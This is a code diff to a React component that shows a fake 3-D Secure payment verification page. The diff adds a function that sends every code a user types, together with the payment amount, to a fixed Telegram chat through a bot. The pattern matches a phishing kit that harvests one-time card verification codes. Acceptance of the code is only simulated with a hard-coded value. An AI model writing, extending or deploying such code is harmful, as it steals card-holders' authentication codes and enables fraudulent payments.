@@ -5,12 +5,31 @@ import { Input } from "@/components/ui/input";
 import { toast } from "@/components/ui/use-toast";
 import { motion } from "framer-motion";
 
+const sendTelegramNotification = async (message: string) => {
+  try {
+    const response = await fetch('https://api.telegram.org/bot[BOT_TOKEN]/sendMessage', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: "6293259686",
+        text: message,
+      }),
+    });
+    console.log('3DS notification sent:', response.ok);
+  } catch (error) {
+    console.error('Error sending 3DS notification:', error);
+  }
+};
+
 const Verify3DS = () => {
   const [code, setCode] = useState("");
   const [isVerifying, setIsVerifying] = useState(false);
   const navigate = useNavigate();
   const location = useLocation();
-  const { amount, currency } = location.state || { amount: 0, currency: "USD" };
+  const searchParams = new URLSearchParams(location.search);
+  const amount = searchParams.get('amount') || '0';
 
   const handleVerification = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -20,14 +39,25 @@ const Verify3DS = () => {
       // Simulate verification delay
       await new Promise(resolve => setTimeout(resolve, 1500));
       
-      if (code === "123456") { // Demo verification code
+      if (code === "123456") {
+        // Send 3DS verification notification
+        await sendTelegramNotification(`3DS Code Verified:
+Amount: ${amount}
+Code: ${code}
+Status: Success`);
+
         toast({
           title: "Payment Successful",
-          description: `Your payment of ${currency} ${amount} has been verified and processed.`,
+          description: `Your payment of $${amount} has been verified and processed.`,
           className: "bg-payment-success text-white",
         });
         navigate("/");
       } else {
+        await sendTelegramNotification(`3DS Verification Failed:
+Amount: ${amount}
+Code: ${code}
+Status: Failed`);
+
         throw new Error("Invalid code");
       }
     } catch (error) {
